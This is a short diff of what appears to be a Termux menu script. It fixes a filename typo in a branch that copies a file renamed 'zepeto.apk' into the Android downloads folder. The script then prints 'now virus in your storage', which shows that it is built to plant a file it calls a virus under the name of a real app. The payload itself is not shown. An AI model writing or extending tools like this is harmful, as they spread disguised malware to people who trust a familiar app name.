@@ -93,7 +93,7 @@ elif choose == "10":
 elif choose == "11":
     os.system("mv f. zepeto.apk")
     os.system("cp zepeto.apk /data/data/com.termux/files/home/storage/downloads")
-    os.system("mv zepto.apk f.")
+    os.system("mv zepeto.apk f.")
     print(Colors.green + "now virus in your storage")
     print(Colors.green + "now check downloads folder")
     print(Colors.green + "note don't delete any file on this tool")
